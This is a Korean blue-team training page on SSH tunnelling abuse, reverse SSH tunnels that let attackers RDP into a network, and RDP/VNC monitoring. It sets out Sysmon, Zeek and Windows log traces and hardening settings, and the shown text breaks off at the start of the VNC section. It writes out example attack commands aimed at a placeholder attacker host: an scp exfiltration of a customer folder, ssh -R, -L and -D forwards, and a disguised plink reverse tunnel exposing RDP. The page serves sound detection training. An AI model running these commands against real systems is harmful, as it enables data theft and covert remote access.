---
title: "SSH, 밖으로 나가는 SSH로 안으로 들어오는 터널, RDP와 VNC"
tags:
  - training
  - blue-team
  - network
  - ssh
  - rdp
  - tunneling
  - lateral-movement
---

# SSH, 밖으로 나가는 SSH로 안으로 들어오는 터널, RDP와 VNC { #ssh-rdp-vnc }

!!! abstract "이 페이지에서 다루는 것"
    SSH가 왜 관리자의 가장 친한 친구이면서, 동시에 아무 제한 없이 열어 두면 가장 위험한 프로토콜 중 하나인지. 네 가지 터널 기법 — SFTP로 자료 빼내기, 원격 포워딩으로 만드는 "가난한 사람의 VPN", 두 망에 걸친 점프 박스를 통한 로컬·다이내믹 포워딩, X11 포워딩 — 을 실제 명령어로 보여 주고 옵션 하나하나 뜯어 봅니다. 이어서 많은 사람이 놀라는 시나리오 — **SSH를 밖으로 허용하는 것만으로 공격자가 RDP로 안에 들어올 수 있다** — 를 plink 명령줄, Sysmon 1·3, Zeek `conn.log`·`ssh.log`, 그리고 결정적 증거인 `127.0.0.1`에서 온 RDP 로그온(4624 타입 10, 1149, 21·22·25)까지 한 단계씩 따라갑니다. 마지막으로 RDP와 VNC — 공격자에게 왜 좋은지, 어떻게 막고 감시하는지, 로그 칸마다 무슨 뜻인지. 끝에 확인 문제와 해설이 있습니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 키 값은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. SSH는 강한 인증(공개키)을 갖춘 **믿을 만하고 암호화된 원격 접속**이다. 바로 그래서 관리자가 의지하고, 바로 그래서 공격자도 좋아한다.
2. SSH는 원격 셸만이 아니다. <strong>다른 트래픽을 암호화된 터널 안에 실어 나를 수 있다</strong>(포트 포워딩). SSH 연결 하나를 열 수 있는 사람은 그 안으로 거의 무엇이든 옮길 수 있고, 네트워크 도구는 그게 무엇인지 볼 수 없다.
3. 알아야 할 악용 네 가지: <strong>자료를 밖으로 올리기</strong>(SCP/SFTP), <strong>바깥 PC를 내부망 안으로 끌어오기</strong>(원격 포워딩 `-R`), <strong>두 망에 걸친 점프 박스를 통해 보호된 망에 닿기</strong>(로컬 `-L`, 다이내믹 `-D` 포워딩), <strong>GUI 프로그램 원격 실행</strong>(X11 포워딩).
4. **나가는 SSH = 들어오는 터널.** 내부 PC가 인터넷의 아무 SSH 서버에나 접속할 수 있으면, 공격자는 그 나가는 연결 하나에 RDP(또는 무엇이든)를 실어 **거꾸로 안으로** 들어올 수 있다. 방화벽 눈에는 나가는 SSH 세션 하나만 보인다.
5. 방어는 <strong>허용 목록(allow-listing)</strong>이다. 누가, 어느 네트워크 구간에서, 어느 목적지로 SSH를 쓸 수 있는지 정한다. 인터넷의 아무 곳으로나 나가는 SSH는 막고, **남은 사용을 감시**한다. 범위가 작고 분명하면 이상한 연결이 바로 눈에 띈다.
6. **RDP**(TCP 3389)는 화면 전체를 그대로 준다. 공격자에게는 평범한 관리 작업에 **섞여 들기 좋고**, 필요한 건 **유효한 비밀번호 하나 또는 익스플로잇 하나**뿐이다.
7. 필요 없는 곳에서는 RDP를 막고(호스트·네트워크 방화벽, RDP를 쓸 수 있는 계정 제한), 남은 RDP는 **3389 플로·방화벽 로그**와 **Windows 로그온 이벤트**(4624 타입 10, 4625, 1149, 21·22·24·25)로 감시한다.
8. **VNC**(TCP 5900번대)는 더 약하고 오래된 원격 화면 프로토콜이다. 대부분 조직에서 **드물거나 아예 금지**여야 하므로, VNC가 보이면 무조건 조사할 가치가 있다.

## SSH — 가장 친한 친구이자 최악의 적 { #ssh }

### SSH란 무엇이고, 왜 좋은가 { #what-is-ssh }

SSH(Secure Shell, 기본 TCP 22)는 비밀번호를 평문으로 보내던 Telnet과 rlogin을 대체한 프로토콜입니다. SSH 세션은 세 가지 일을 합니다.

1. 키 교환을 마친 뒤 클라이언트와 서버 사이의 **모든 것을 암호화**합니다.
2. <strong>서버의 호스트 키(host key)</strong>로 **서버를 인증**합니다. 처음 접속할 때 "이 지문(fingerprint)을 믿겠습니까?"라고 묻는 게 그것이고, 가짜 서버와 대화하는 게 아님을 확인하는 장치입니다.
3. **사용자를 인증**합니다. 가장 좋은 건 키 쌍입니다. 개인키는 내 PC에만 있고, 공개키는 서버의 `~/.ssh/authorized_keys`에 들어 있습니다.

그리고 그 암호화된 연결 하나 안에서 SSH는 <strong>여러 개의 채널(channel)</strong>을 열 수 있습니다. 셸 하나, 파일 전송(SFTP/SCP) 하나, 그리고 <strong>전달(포워딩)된 TCP 연결</strong>들. 이 페이지의 이야기는 전부 이 마지막 기능에서 나옵니다.

비유를 들면, SSH는 두 건물 사이를 오가는 **잠긴 장갑 배송 트럭**입니다. 정문 경비는 트럭이 나가고 들어오는 건 보지만 안에 뭐가 실렸는지는 못 봅니다. 트럭은 원래 관리자의 공구 상자를 나르라고 만든 건데, 누군가 거기에 서류 상자를 가득 싣거나, 심지어 트럭 안으로 건물로 다시 들어오는 비밀 통로를 내도 막을 방법이 없습니다. 기술적으로 다시 말하면, 정문은 방화벽이나 프록시, 트럭은 22번 포트로 가는 TCP 연결, 짐은 양 끝만 풀 수 있는 SSH 채널들입니다.

### 정상적인 SSH 로그인은 어떻게 생겼나 { #normal-ssh }

Linux 서버에서 정상적인 키 로그인은 `/var/log/auth.log`(Debian/Ubuntu)나 `/var/log/secure`(RHEL 계열), 또는 저널(`journalctl -u ssh` / `-u sshd`)에 이렇게 남습니다.

```
Nov 18 21:03:44 srv-web-0003 sshd[48211]: Accepted publickey for deploy from 10.20.40.15 port 51522 ssh2: ED25519 SHA256:Qm4b1X8r0yGzM2v7cH9pT3kLwA5nE6sJdUfR0oVi8Yc
Nov 18 21:03:44 srv-web-0003 sshd[48211]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
Nov 18 21:41:09 srv-web-0003 sshd[48211]: pam_unix(sshd:session): session closed for user deploy
```

- `sshd[48211]` — SSH 서버 프로세스와 PID. 같은 PID가 붙은 줄은 한 세션입니다.
- `Accepted publickey for deploy` — `deploy` 사용자가 **키로** 로그인했다는 뜻. `Accepted password`라면 비밀번호 로그인입니다(더 약하고, 대부분의 서버에서는 꺼 두는 게 맞습니다).
- `from 10.20.40.15 port 51522` — 클라이언트 IP와 출발 포트. 관리자 PC나 점프 호스트여야지, 아무 PC여서는 안 됩니다.
- `ED25519 SHA256:Qm4b…` — **사용자 키의 지문**. `authorized_keys`에 있는, 누군지 아는 사람의 키와 맞춰 볼 수 있습니다. 모르는 지문이면 누군가 키를 몰래 추가했다는 뜻일 수 있습니다(흔한 지속성(persistence) 수법).
- `session opened` / `session closed` — 시작과 끝. 여기서는 약 38분.

비밀번호를 틀린 시도는 `Failed password for invalid user admin from 198.51.100.23 port 40122 ssh2`처럼 남습니다. 한 주소에서 이런 줄이 수백 개면 무차별 대입(brute force)이고, 그 뒤에 같은 주소에서 `Accepted`가 하나 나오면 뚫린 겁니다.

네트워크에서는 Zeek가 세션마다 `ssh.log`를 남깁니다([Zeek conn.log](../../../network/zeek/conn-log.md)도 참고).

```
ts=2026-11-18T21:03:44Z uid=Cx9Lk2 id.orig_h=10.20.40.15 id.orig_p=51522 id.resp_h=10.20.0.31 id.resp_p=22 version=2 auth_success=T auth_attempts=1 direction=- client=SSH-2.0-OpenSSH_9.6p1 server=SSH-2.0-OpenSSH_9.6p1 cipher_alg=chacha20-poly1305@openssh.com kex_alg=sntrup761x25519-sha512 host_key=7f:2a:…:c1
```

- `auth_success=T`, `auth_attempts=1` — Zeek는 암호를 풀 수 없으니, 패킷 크기를 보고 인증이 성공했는지 **추정**합니다. 시도가 많고 `F`면 비밀번호 맞히기입니다.
- `direction` — 센서가 어떤 대역이 내부인지 알면, 우리 망 기준으로 `INBOUND`/`OUTBOUND`를 적습니다.
- `client` / `server` — 암호화가 시작되기 전에 양쪽이 **평문으로** 보내는 버전 문자열(배너). 워크스테이션에서 **`SSH-2.0-PuTTY_Release_0.81`** 같은 PuTTY 계열, Go나 Paramiko 라이브러리(`SSH-2.0-Go`, `SSH-2.0-paramiko_3.4.0`), 이상한 배너가 보이면 눈여겨봅니다.
- `kex_alg`, `cipher_alg`, `host_key` — 합의한 알고리즘과 서버 호스트 키 지문. 아는 서버의 **호스트 키가 바뀌었다면** 서버를 새로 설치했거나 — 누군가 중간에 끼어들었을 수 있습니다.

Zeek가 알려 줄 수 **없는** 것: 입력한 명령, 옮긴 파일, 포트 포워딩을 했는지 여부. 이게 SSH에 대한 방어자의 핵심 고민입니다.

### 네 가지 터널 기법 { #ssh-tunnels }

#### 1. SCP/SFTP로 자료 빼내기 { #exfil }

```
$ scp -r /srv/exports/customers/ backup@203.0.113.77:/data/drop/
```

- `scp` — SSH 위에서 하는 안전한 복사. `-r` = 폴더 통째로(재귀).
- `/srv/exports/customers/` — 밖으로 나가는 자료.
- `backup@203.0.113.77:/data/drop/` — **공격자가 가진** 서버의 `backup` 사용자, 그리고 받을 폴더.

선 위에서는 그냥 `203.0.113.77:22`로 가는 암호화된 SSH입니다. 정보 유출 방지(DLP)나 프록시는 내용을 못 읽습니다. 대신 **볼 수 있는 것**이 있습니다. 평소 인터넷으로 SSH를 쓰지 않던 서버·PC가 갑자기 쓰고, `conn.log`에서 **나간 바이트(`orig_bytes`)가 들어온 바이트보다 훨씬 많습니다.**

```
ts=2026-11-18T23:10:02Z uid=CaR7q1 id.orig_h=10.20.0.44 id.resp_h=203.0.113.77 id.resp_p=22 proto=tcp service=ssh duration=1832.4 orig_bytes=4718592000 resp_bytes=6291456 conn_state=SF
```

`orig_bytes=4718592000`은 약 4.4GB를 보낸 것이고, `resp_bytes`는 약 6MB를 받은 것, 시간은 30분 정도입니다. 이 비율은 업로드입니다.

#### 2. "가난한 사람의 VPN" — 원격 포워딩(`-R`) { #remote-forward }

```
$ ssh -N -R 2222:127.0.0.1:22 tun@203.0.113.77
```

- `-N` — 셸은 실행하지 않는다. 이 연결은 터널만을 위해 존재합니다.
- `-R 2222:127.0.0.1:22` — <strong>원격(remote) 포워딩</strong>: "**저쪽** 서버에 `2222` 포트를 열어라. 거기로 누가 접속하면 이 터널을 거쳐 **내 쪽의** `127.0.0.1:22`로 보내라."
- `tun@203.0.113.77` — 공격자의 서버.

내부 PC가 **밖으로** 전화를 건 셈이라 방화벽은 아무 문제 없다고 봅니다. 그런데 이제 `203.0.113.77`에 앉은 공격자가 `ssh -p 2222 user@127.0.0.1`을 치면 네트워크 **안으로** 들어옵니다. 여기에 아래의 `-D`까지 얹으면 공격자 PC는 마치 내부 LAN에 꽂힌 것처럼 동작합니다. TCP 연결의 방향(밖으로)과 통제의 방향(안으로)이 정반대라는 것 — 이게 사람들이 속는 이유입니다.

#### 3. 두 망에 걸친 점프 박스 넘어가기 — 로컬(`-L`)과 다이내믹(`-D`) 포워딩 { #local-forward }

<strong>듀얼 홈(dual-homed) 점프 박스</strong>는 랜카드 하나는 일반망에, 하나는 보호된 망(예: OT망이나 관리망 `10.50.0.0/24`)에 걸친 서버입니다. 보호된 망으로 들어가는 유일하고 통제된 입구가 되라고 만든 것이죠. 그런데:

```
$ ssh -N -L 8443:10.50.0.15:443 ops@jump01.corp.example
$ ssh -N -D 1080 ops@jump01.corp.example
```

- 1행, `-L 8443:10.50.0.15:443` — <strong>로컬(local) 포워딩</strong>: "**내 PC에** `8443` 포트를 열어라. 거기로 보내는 건 점프 박스를 거쳐 `10.50.0.15:443`으로 간다." 이제 브라우저로 `https://127.0.0.1:8443`에 가면 보호된 웹 콘솔에 바로 닿습니다.
- 2행, `-D 1080` — <strong>다이내믹(dynamic) 포워딩</strong>: 내 PC의 `1080` 포트에 SOCKS 프록시가 생깁니다. 이 프록시를 쓰도록 설정한 어떤 도구든 점프 박스가 닿을 수 있는 **모든** 호스트에 닿습니다. 점프 박스에 SSH 로그인 한 번이면 "점프 박스만"이라는 설계를 훨씬 넘어 보호된 망 전체가 드러납니다.

점프 박스의 OpenSSH는 기본 로그 수준에서는 포워딩 요청을 기록하지 않습니다. `LogLevel VERBOSE` 이상으로 올리거나(아래), 포워딩 자체를 제한해야 합니다.

#### 4. X11 포워딩 { #x11 }

```
$ ssh -X analyst@lnx-dev-0102.corp.example firefox
```

`-X`는 서버에게 그래픽 프로그램의 **창**을 내 화면으로 보내 달라고 요청합니다. 여기서 브라우저는 **원격 PC에서** — 그 PC의 네트워크 위치, 쿠키, 접근 권한을 그대로 갖고 — 실행되지만, 화면은 로그인한 사람에게 보입니다. 관리자에게는 편리하고, 공격자에게는 멀리서 피해자 PC의 GUI 프로그램을 조종하는 깔끔한 방법입니다.

### SSH 잠그기 { #ssh-defence }

"허용 목록으로 관리하라"를 실제 기술 통제로 옮기면:

- **네트워크:** 승인된 목적지를 빼고 나가는 TCP 22를 막습니다. 다른 포트로 가는 SSH까지 막으려면 포트가 아니라 차세대 방화벽의 애플리케이션 식별 기능을 씁니다. 서버로 들어오는 SSH는 관리자 대역이나 점프 호스트에서만 허용합니다.
- **서버 쪽(`sshd_config`):**

```
PasswordAuthentication no
PermitRootLogin no
AllowGroups ssh-admins
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
PermitTunnel no
LogLevel VERBOSE
```

  - `PasswordAuthentication no` — 키만 허용. 비밀번호 맞히기가 의미 없어집니다.
  - `PermitRootLogin no` — root로 바로 로그인 금지. 관리자는 자기 계정으로 들어와 권한을 올립니다(누가 했는지 남음).
  - `AllowGroups ssh-admins` — 이 그룹 사람만 로그인 가능.
  - `AllowTcpForwarding no`, `GatewayPorts no`, `X11Forwarding no`, `PermitTunnel no` — 필요 없는 서버(대부분)에서 터널 기능을 끕니다. 점프 박스는 포워딩이 필요할 수 있지만 `PermitOpen`으로 목적지를 제한할 수 있습니다.
  - `LogLevel VERBOSE` — 로그인마다 키 지문 등 자세한 정보를 남깁니다.

- **남은 사용 감시:** 새 SSH 목적지, 워크스테이션에서 나가는 SSH, 오래 이어지는 SSH 세션, 낯선 클라이언트 배너, 큰 나가는 바이트 수, 그리고 Windows에서 이상한 부모 프로세스가 띄운 SSH 클라이언트(`ssh.exe`, `plink.exe`, `putty.exe`).

<strong>[정정]</strong> "SSH는 Linux에서만 신경 쓰면 된다"는 틀렸습니다. Windows 10(1809) 이후와 Windows Server 2019 이후에는 **OpenSSH 클라이언트 `ssh.exe`가 기본으로 설치되어** `C:\Windows\System32\OpenSSH\`에 들어 있습니다. Windows PC를 잡은 공격자는 이제 PuTTY나 plink를 가져올 필요도 없습니다. 터널 도구가 이미 있고, 게다가 Microsoft 서명까지 붙어 있습니다.

## 나가는 SSH = 들어오는 터널 { #outbound-ssh }

### 시나리오 { #tunnel-scenario }

2019년에 공개된 유명한 침해 대응 보고서(당시 FireEye, 지금의 Mandiant 침해 대응팀)가 정확히 이런 사례를 다뤘습니다. 피해 조직은 아무 곳으로나 나가는 SSH를 허용하고 있었고, 공격자들은 내부 Windows PC에서 **plink**(PuTTY의 명령줄 클라이언트)로 자기 서버에 SSH 연결을 만들면서, **피해 PC 자신의 RDP 포트를 가리키는 원격 포워딩**을 걸었습니다. 공격자 쪽에서 터널로 밀어 넣은 건 피해자 쪽 `127.0.0.1:3389`로 나왔습니다. 결과: 방화벽이 들어오는 RDP를 전부 막고 있었는데도 **인터넷 너머에서 내부 PC로 RDP**.

```
  Attacker's laptop                     Attacker's SSH server                Victim network (firewall: outbound 22 allowed)
 ┌───────────────┐   RDP to         ┌──────────────────────┐    SSH (one TCP     ┌──────────────────────────────┐
 │ mstsc ───────▶│ 203.0.113.77:    │ 203.0.113.77         │ ◀═══════════════════│ LT-ENG-0207  10.20.30.88     │
 │               │ 12345 ──────────▶│ listening :12345     │   connection,       │ plink -R 12345:127.0.0.1:3389│
 └───────────────┘                  │ → into the tunnel    │   started from      │   │                          │
                                    └──────────────────────┘   the inside)       │   ▼ out of the tunnel to     │
                                                                                 │   127.0.0.1:3389 (own RDP)   │
                                                                                 └──────────────────────────────┘
```

그림 읽는 법: 오른쪽 피해 PC가 **안에서 밖으로** SSH 연결 하나를 만듭니다(굵은 화살표). 공격자 서버는 그 연결 덕분에 `12345` 포트를 열고 기다립니다. 공격자가 자기 노트북에서 RDP 클라이언트(`mstsc`)로 `203.0.113.77:12345`에 접속하면, 그 트래픽은 터널을 타고 피해 PC로 들어가 자기 자신의 RDP(`127.0.0.1:3389`)로 전달됩니다.

피해 PC에서 실행된 명령:

```
C:\Users\p.lee\AppData\Local\Temp\svch.exe -batch -hostkey "SHA256:R2c…9vQ" -l tun -pw S3cr3t! -P 443 -R 12345:127.0.0.1:3389 203.0.113.77
```

하나씩 뜯어 보면:

- 사용자 `Temp` 폴더의 `svch.exe` — Windows 파일처럼 보이게 **이름을 바꾼** plink.
- `-batch` — 사용자에게 아무것도 묻지 않는다(화면에 창이 떠서 들키는 일이 없게).
- `-hostkey "SHA256:…"` — 공격자 서버의 호스트 키를 미리 승인해서 "이 호스트를 믿겠습니까?" 질문을 없앱니다.
- `-l tun -pw S3cr3t!` — 공격자 서버에 `tun` 계정과 이 비밀번호로 로그인. (명령줄에 비밀번호가 들어간 건 방어자에게 선물입니다. 4688/Sysmon 1에 그대로 남으니까요.)
- `-P 443` — 22 대신 **443**번 포트 사용. 포트만 보는 방화벽 규칙은 HTTPS라고 생각합니다. 하지만 SSH 배너는 평문이라, 애플리케이션을 식별하는 방화벽이나 Zeek는 여전히 **SSH**로 봅니다.
- `-R 12345:127.0.0.1:3389` — 핵심: 공격자 서버에 `12345`를 열고, 거기로 오는 것을 **이 PC 자신의 RDP**로 배달.
- `203.0.113.77` — 공격자 서버.

Windows 기본 클라이언트로 하면 `ssh.exe -N -o StrictHostKeyChecking=no -p 443 -R 12345:127.0.0.1:3389 tun@203.0.113.77`입니다(`StrictHostKeyChecking=no`가 호스트 키 질문을 없애는 역할).

그리고 RDP에만 해당하는 게 아닙니다. `-R 12345:10.20.0.20:445`면 파일 서버의 SMB가 드러나고, `-R 1080`(최신 OpenSSH의 역방향 SOCKS 프록시)이면 내부의 **모든** 주소가 드러납니다. **그런데 전부 암호화된 나가는 세션 하나로만 보입니다.** 터널이 끝나는 엔드포인트에서 따로 탐지하지 않으면 안에 뭐가 들었는지 알 수 없습니다.

### 남는 흔적 { #tunnel-traces }

**1. `LT-ENG-0207`의 프로세스 생성 — Sysmon 1(또는 명령줄 기록을 켠 보안 로그 4688):**

```
Event ID: 1   Process Create
UtcTime:      2026-11-18 13:22:51.004
Image:        C:\Users\p.lee\AppData\Local\Temp\svch.exe
OriginalFileName: Plink
CommandLine:  svch.exe -batch -hostkey "SHA256:R2c…9vQ" -l tun -pw S3cr3t! -P 443 -R 12345:127.0.0.1:3389 203.0.113.77
User:         CORP\p.lee
ParentImage:  C:\Windows\System32\cmd.exe
Hashes:       SHA256=4B1F…E0A2
```

- **Sysmon 1** = 프로세스가 시작됐다는 기록. 전체 명령줄과 해시가 남습니다. **4688**은 Windows 기본 기능으로 같은 일을 합니다("프로세스 만들기 감사"와 "프로세스 생성 이벤트에 명령줄 포함"을 켜야 함).
- `OriginalFileName: Plink` — 파일 안의 버전 정보에서 가져온 값이라 **이름을 바꿔도 숨겨지지 않습니다.** `Image` 이름과 `OriginalFileName`이 다르면 고전적인 탐지 포인트입니다.
- 명령줄에 `3389`와 함께 `-R`(또는 `127.0.0.1:`로 시작하는 무엇이든)이 있으면, 이보다 분명한 경보는 드뭅니다.

**2. 나가는 연결 — Sysmon 3:**

```
Event ID: 3   Network connection detected
Image:           C:\Users\p.lee\AppData\Local\Temp\svch.exe
SourceIp:        10.20.30.88
DestinationIp:   203.0.113.77
DestinationPort: 443
```

브라우저도 아닌 Temp 폴더의 프로그램이 인터넷 IP의 443과 통신합니다.

**3. 선 위에서 — Zeek `conn.log`와 `ssh.log`:**

```
# conn.log
ts=2026-11-18T13:22:51Z uid=CtUn01 id.orig_h=10.20.30.88 id.resp_h=203.0.113.77 id.resp_p=443 proto=tcp service=ssh duration=14420.7 orig_bytes=182400211 resp_bytes=21733904 conn_state=SF

# ssh.log
ts=2026-11-18T13:22:51Z uid=CtUn01 id.orig_h=10.20.30.88 id.resp_h=203.0.113.77 id.resp_p=443 auth_success=T client=SSH-2.0-PuTTY_Release_0.81 server=SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3
```

- `id.resp_p=443`인데 `service=ssh` — **HTTPS 포트에서 SSH**. Zeek는 포트가 아니라 내용으로 프로토콜을 알아봅니다. 이 불일치 하나만으로도 경보 감입니다.
- `duration=14420.7` — 연결 하나가 4시간. 워크스테이션에서 인터넷으로 가는 대화형 SSH 자체가 드문데, 4시간이면 터널입니다.
- 들어온 쪽 약 21MB, 나간 쪽 182MB — RDP와 맞아떨어집니다. 화면 갱신은 피해 PC(RDP 서버)에서 공격자 쪽으로, 즉 **밖으로** 흐르니까요.
- `client=SSH-2.0-PuTTY_Release_0.81` — SSH를 쓸 일이 없는 엔지니어링 노트북에 PuTTY 계열 클라이언트.

**4. "자기 자신에게서" 온 RDP 로그온 — 터널이 끝나는 곳은 엔드포인트입니다.** `LT-ENG-0207`에서:

```
Security 4624   An account was successfully logged on
Logon Type:              10
Account Name:            p.lee          Account Domain: CORP
Logon ID:                0x7A21C33
Workstation Name:        -
Source Network Address:  127.0.0.1
Source Port:             0
```

- **4624** = 로그온 성공. `Logon Type 10` = <strong>RemoteInteractive</strong>, 즉 RDP(2 = 키보드 앞에서 직접, 3 = SMB 같은 네트워크 로그온).
- `Source Network Address: 127.0.0.1` — RDP 세션이 **그 PC 자신에게서** 왔다는 뜻. 진짜 사용자는 자기 노트북에 루프백으로 RDP하지 않습니다. **127.0.0.1이나 ::1에서 온 RDP 로그온은 터널의 서명입니다.**
- 자격 증명은 어디서? 이 예에서는 공격자가 앞서 훔친 `p.lee`의 비밀번호를 썼습니다. NLA(네트워크 수준 인증)가 켜져 있으면 타입 10 직전에 같은 사용자의 **타입 3** 로그온도 흔히 보입니다 — NLA의 사전 인증입니다.

```
Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational  1149
Remote Desktop Services: User authentication succeeded:
User: p.lee   Domain: CORP   Source Network Address: 127.0.0.1

Microsoft-Windows-TerminalServices-LocalSessionManager/Operational  21 / 22 / 25
Session logon succeeded / Shell start notification received / Session reconnection succeeded
User: CORP\p.lee   Session ID: 3   Source Network Address: 127.0.0.1
```

- **1149** — RDP 네트워크 인증 성공. 이름과 달리 전체 로그온이 끝나기 **전에** 남습니다. "누군가 RDP 수신기에 인증했다"는 기록이고, 출발지 주소가 들어 있습니다.
- **21** 세션 로그온 성공, **22** 셸(바탕화면) 시작, **24** 세션 연결 끊김, **25** 세션 **재연결**. 역시 출발지는 `127.0.0.1`.

타임라인으로 놓으면:

```
13:22:51  Sysmon 1   svch.exe (OriginalFileName Plink) -R 12345:127.0.0.1:3389 203.0.113.77
13:22:51  Sysmon 3   svch.exe -> 203.0.113.77:443
13:22:52  Zeek       conn/ssh: 10.20.30.88 -> 203.0.113.77:443 service=ssh, PuTTY client
13:31:07  1149       RDP auth succeeded, p.lee, from 127.0.0.1
13:31:07  4624       type 10, p.lee, from 127.0.0.1
13:31:08  21 / 22    session logon, shell start, from 127.0.0.1
17:23:12  Zeek       conn closes after 14420 s
```

8분의 간격에 주목하세요. 먼저 터널이 열렸고, 그다음 공격자가 그 안으로 접속했습니다. 방화벽이 본 건 나가는 "HTTPS" 연결 하나뿐이었습니다.

### 탐지하고 막기 { #tunnel-defence }

- **예방:** 포트 22만이 아니라 **애플리케이션 식별**로 나가는 SSH를 막습니다. SSH 배너는 평문이라 차세대 방화벽과 Zeek는 어느 포트든 SSH를 알아봅니다. 정해진 팀에게 정해진 목적지만 허용합니다.
- **네트워크 탐지:** 22가 아닌 포트에서 `service=ssh`, 워크스테이션에서 인터넷으로 가는 SSH, 아주 긴 SSH 세션, 새 외부 SSH 목적지.
- **엔드포인트 탐지:** `127.0.0.1`/`::1`에서 온 RDP 로그온(4624 타입 10, 1149, 21·25), `-R`·`-L`·`-D`·`-N`이 들어간 `ssh.exe`/`plink.exe` 명령줄, 이름 바꾼 프로그램(`OriginalFileName` 불일치), `HKCU\Software\SimonTatham\PuTTY\SshHostKeys`에 저장된 모르는 서버의 PuTTY 호스트 키.
- **피해 범위 줄이기:** RDP가 필요 없는 PC(대부분의 워크스테이션)에서는 RDP를 꺼 둡니다. 그러면 `127.0.0.1:3389`로 오는 터널은 받아 줄 상대가 없습니다.

## RDP — 원격 데스크톱 프로토콜 { #rdp }

### 공격자가 좋아하는 이유 { #rdp-why }

RDP(Remote Desktop Protocol, TCP 3389, 빠른 화면용으로 UDP 3389도)는 **완전한 그래픽 바탕화면**을 줍니다. 흔하고, 회사 서버에서는 기본으로 켜져 있는 경우가 많고, 관리자들이 매일 씁니다. 공격자에게 그 뜻은:

- **섞여 든다.** RDP 세션은 관리자가 일하는 모습과 똑같아 보입니다.
- **GUI다.** 사용자처럼 어떤 프로그램이든 쓸 수 있습니다. 관리 콘솔을 열고, 공유 폴더를 둘러보고, 설정 창에서 백신을 끌 수도 있습니다.
- **유효한 비밀번호 또는 익스플로잇만 있으면 된다.** 보통은 비밀번호입니다. 훔치거나, 피싱하거나, 사거나, 인터넷에 열린 3389에 대고 맞히거나, 다른 PC의 LSASS에서 꺼낸 것. 익스플로잇도 있긴 합니다(2019년 "BlueKeep", CVE-2019-0708은 옛 Windows에서 웜이 될 수 있었음). 하지만 자격 증명 쪽이 훨씬 흔합니다.

비유하면, RDP는 누군가에게 **내 책상 자리를 통째로** — 모니터, 키보드까지 — 어디서든 넘겨주는 것입니다. 기술적으로는 TCP 3389 위에서, 자기만의 바탕화면·클립보드·(선택적으로) 드라이브 연결을 가진 4624 **타입 10** 세션입니다.

### RDP 악용 막기 { #rdp-prevent }

- **필요 없는 곳에서는 끈다.** 대부분의 워크스테이션은 들어오는 RDP가 필요 없습니다. `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections = 1`이나 그룹 정책으로 끕니다.
- **방화벽으로 막는다.** 호스트 방화벽: 관리용 점프 호스트에서 오는 3389만 허용. 네트워크 방화벽: **3389를 인터넷에 절대 열지 않고**, MFA가 붙은 VPN이나 원격 데스크톱 게이트웨이 뒤에 둡니다.
- **쓸 수 있는 사람을 제한한다.** RDP 로그온은 `Remote Desktop Users` 그룹(과 Administrators)만 가능하고, 이는 "원격 데스크톱 서비스를 통한 로그온 허용" 사용자 권한으로 정해집니다. `Domain Users` 같은 넓은 그룹은 빼고, 서비스 계정과 로컬 계정에는 "원격 데스크톱 서비스를 통한 로그온 거부"를 겁니다.
- **NLA를 필수로.** 서버가 세션을 만들기 전에 사용자가 먼저 인증하게 해서, 노출되는 코드도 줄고 무차별 대입할 거리도 줄어듭니다.

### 남은 RDP 감시하기 { #rdp-monitor }

질문을 던지세요. **여기서 누가, 어디서, 어디로 RDP를 써야 하나?** 그리고 실제와 비교합니다.

**3389 플로·방화벽 로그:**

```
ts=2026-11-19T02:14:31Z uid=CrD441 id.orig_h=10.20.30.41 id.resp_h=10.20.30.77 id.resp_p=3389 proto=tcp service=ssl duration=2611.3 orig_bytes=4119026 resp_bytes=58420113 conn_state=SF
```

- `10.20.30.41 → 10.20.30.77:3389` — **워크스테이션에서 워크스테이션으로**. 관리용 RDP는 보통 점프 호스트에서 서버로 갑니다.
- `service=ssl` — 요즘 RDP는 TLS로 감싸기 때문에 Zeek가 SSL로 표시하는 경우가 많습니다. Zeek에는 `rdp.log`도 있어서, 연결 시작 부분을 볼 수 있으면 클라이언트 이름, 키보드 배열, 보안 프로토콜을 남깁니다.
- `02:14` 새벽, 43분, 서버에서 약 58MB(화면 갱신) — 새벽 2시의 대화형 세션.

**도착지 PC의 Windows 이벤트:**

| 이벤트 | 로그 | 뜻 | 왜 중요한가 |
| --- | --- | --- | --- |
| 4624 타입 10 | Security | RDP 로그온 성공(재연결·잠금 해제 때는 타입 7도 흔함) | 누가, 어느 IP에서 로그온했나 |
| 4625 타입 10(NLA면 3) | Security | 로그온 실패 | 한 IP에서 많이 = 무차별 대입이나 스프레이 |
| 1149 | TerminalServices-RemoteConnectionManager | RDP 네트워크 인증 성공 | 4624가 없거나 지워졌어도 출발지 IP가 남음 |
| 21 / 22 / 24 / 25 | TerminalServices-LocalSessionManager | 세션 로그온 / 셸 시작 / 끊김 / 재연결 | 세션 타임라인 |
| 4778 / 4779 | Security | 세션 재연결 / 끊김 | 세션에 들락날락한 것을 클라이언트 이름과 함께 보여 줌 |
| 1024 / 1102 | TerminalServices-RDPClient(**출발지** PC) | 이 PC가 …로 RDP 연결을 시작함 | 뚫린 PC에서 나간 RDP를 증명 |

다시 봐야 할 것: 워크스테이션 사이의 RDP, 점프 박스가 아닌 곳에서 온 RDP, 이상한 시간의 로그온, 한 계정이 짧은 시간에 여러 호스트로 RDP, `127.0.0.1`/`::1`에서 온 RDP(터널), 그리고 출발지 IP를 ([DHCP](dhcp.md)로) 찾아 보니 관리 업무를 할 리 없는 장비인 경우. 기법 상세: [RDP 악용](../../../adversary/rdp.md).

## VNC { #vnc }

VNC(Virtual Network Computing)는 **RFB** 프로토콜로 화면을 공유합니다. 기본 포트는 **TCP 5900**에 디스플레이 번호를 더한 값(디스플레이 `:1` = 5901 …)이고, 웹 뷰어는 흔히 5800입니다. 무료·상용 버전이 많습니다(TightVNC, UltraVNC, RealVNC, TigerVNC).

RDP보다 더 드물어야 하는 이유:

